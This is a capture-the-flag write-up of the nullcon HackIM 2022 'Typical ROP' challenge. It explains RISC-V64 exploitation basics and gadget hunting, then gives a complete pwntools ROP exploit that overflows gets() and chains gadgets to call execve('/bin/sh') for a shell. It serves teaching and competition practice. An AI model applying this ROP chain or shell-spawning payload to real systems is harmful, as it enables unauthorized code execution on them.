### Typical ROP


was a pwn challenge from nullcon HackIM 2022 ctf.

it was a RISCV64 binary to exploit, a simple gets overflow as you can see in the reverse

![](https://github.com/nobodyisnobody/write-ups/raw/main/nullcon.HackIM.2022/pwn/typical.ROP/pics/reverse.png)

this challenge got only 2 solves, but not because of his difficulty,

just because people are not used to riscv64 architecture, and not much tools are supporting it.. (no ROPgagdget, etc...)

first you have to use dev branch from pwntools, because (at the time I write this) main branch does not have riscv support.

So install pwntools dev branch from their github.

**To resume quickly riscv64 architecture from a pwn point of view:**

* well... that's a risc processor not much different from mips , aarch64, etc...

* for syscalls, arguments are in registers (in order):   **a0**, **a1**, **a2**, **a3**, **a4**, etc...
 
* syscall number is in register: **a7**
 
* ret instruction, returns to address stored in **ra** register (and not pop address from stack)
 
* jalr (equivalent to call)  , store return address in **ra**,  and jump to our function
 
* ahh yes, and syscall instruction is named **ecall** (why not..)
 
You will have to install riscv cross compiler and tools (at least binutils part, to have objdump).

on ubuntu you can install them with:  `sudo apt install gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu`

as actually ROPGadget, ropper, and co... does not support riscv architecture..

you have to find your gadgets by yourself,  using command `riscv64-linux-gnu-objdump -axd chal`

to disassemble program, and grepping, looking, searching...etc... to find usefull gadgets..

from my previous riscv64 experience, I know that there is a convenient gadget in riscv64 libc,

that looks like this:

![](https://github.com/nobodyisnobody/write-ups/raw/main/nullcon.HackIM.2022/pwn/typical.ROP/pics/gadget.png)

I think it's like the setcontext gadget in x86_64 libc, it sets all the registers from stack,

advance stack, and jump to address in **a0** (that is transfered to t1, at the beginning of the gadget)

that gadget is perfect for us, it need just another gadget to set **a0** before,

then it just set everything we need (and even more),  you can also set **ra** for the return address.. to chain gadgets...

we will use this gadget to set **a0**:

`gadget0 = 0x45a06 # ld a0,16(sp) / ld ra,40(sp) / addi sp,sp,48 / ret`

and off course, a gadget that points to a **ecall** instruction:

the rest of the exploitation is classic,  we read *'/bin/sh'* string in .bss by calling gets(),

then execute execve('/bin/sh',0,0) to get a nice shell.. like this:

![](https://github.com/nobodyisnobody/write-ups/raw/main/nullcon.HackIM.2022/pwn/typical.ROP/pics/gotshell.gif)

one last thing ,

for debugging the program.. you can use a setup like I did in my exploit:

```python
p = process('qemu-riscv64 -g 1234 ./chal',shell=True)
q = process("xfce4-terminal --title=GDB-Pwn --zoom=0 --geometry=128x98+1100+0 -x gdb-multiarch -ex 'source ~/gdb.plugins/gef/gef.py' -ex 'set architecture riscv64' -ex 'target remote localhost:1234' -ex 'b *0x1064a' -ex 'c'", shell=True)
```

on process run the qemu with gdb listening on port 1234, we will communicate with his stdin/stdout ..

the other process run in a terminal windows (edit the xfce4-terminal as you like), and run gdb-multiarch that connect to qemu via port 1234... you can set your breakpoint..etc...

**here is the exploit:**

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="riscv", os="linux")
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x98+1100+0', '-e']
context.log_level = 'info'


exe = ELF('./chal')

host, port = "52.59.124.14", "10204"

if args.REMOTE:
  p = remote(host,port)
else:
  if args.GDB:
    p = process('qemu-riscv64 -g 1234 ./chal',shell=True)
    q = process("xfce4-terminal --title=GDB-Pwn --zoom=0 --geometry=128x98+1100+0 -x gdb-multiarch -ex 'source ~/gdb.plugins/gef/gef.py' -ex 'set architecture riscv64' -ex 'target remote localhost:1234' -ex 'b *0x1064a' -ex 'c'", shell=True)
  else:
    p = process('./run.sh')


# the gadget we will use to set out registers
'''
  3d832:       832a                    mv      t1,a0
   3d834:       60a6                    ld      ra,72(sp)
   3d836:       6522                    ld      a0,8(sp)
   3d838:       65c2                    ld      a1,16(sp)
   3d83a:       6662                    ld      a2,24(sp)
   3d83c:       7682                    ld      a3,32(sp)
   3d83e:       7722                    ld      a4,40(sp)
   3d840:       77c2                    ld      a5,48(sp)
   3d842:       7862                    ld      a6,56(sp)
   3d844:       6886                    ld      a7,64(sp)
   3d846:       2546                    fld     fa0,80(sp)
   3d848:       25e6                    fld     fa1,88(sp)
   3d84a:       3606                    fld     fa2,96(sp)
   3d84c:       36a6                    fld     fa3,104(sp)
   3d84e:       3746                    fld     fa4,112(sp)
   3d850:       37e6                    fld     fa5,120(sp)
   3d852:       280a                    fld     fa6,128(sp)
   3d854:       28aa                    fld     fa7,136(sp)
   3d856:       6149                    addi    sp,sp,144
   3d858:       8302                    jr      t1
'''


ecall = 0x37e34
gadget0 = 0x45a06 # ld a0,16(sp) / ld ra,40(sp) / addi sp,sp,48 / ret
gadget1 = 0x3d832

if args.REMOTE:
  print('wait calculating hashcash shit...')
  cmd = p.recvuntil('\n',drop=True)
  s = process(cmd,shell=True)
  s.recvuntil('token: ',drop=True)
  token = s.recvuntil('\n',drop=True)
  s.close()
  p.sendlineafter('token: ', token)

#payload = shellc.ljust(72,'\x00')
payload = 'A'*72
# load a0 with gets address and jump to gadget1
payload += p64(gadget0)+p64(0)*2+p64(exe.sym['gets'])+p64(0)*2+p64(gadget1)
# gets to read /bin/sh string to 0x70f00 (.bss)
payload += p64(0)+p64(0x70f00)+p64(0)*6+p64(221)+p64(gadget0)+p64(0)*8
# load a0 with ecall gadget address and jump to gadget1
payload += p64(0)*2+p64(ecall)+p64(0)*2+p64(gadget1)
# load ecall parameters and do ecall (execve('/bin/sh', 0,0)
payload += p64(0)+p64(0x70f00)+p64(0)*6+p64(221)+p64(ecall)+p64(0)*8


p.sendlineafter('input: \n', payload)
p.sendline('/bin/sh\x00')

p.interactive()


```

*nobodyisnobody still pwning things..*

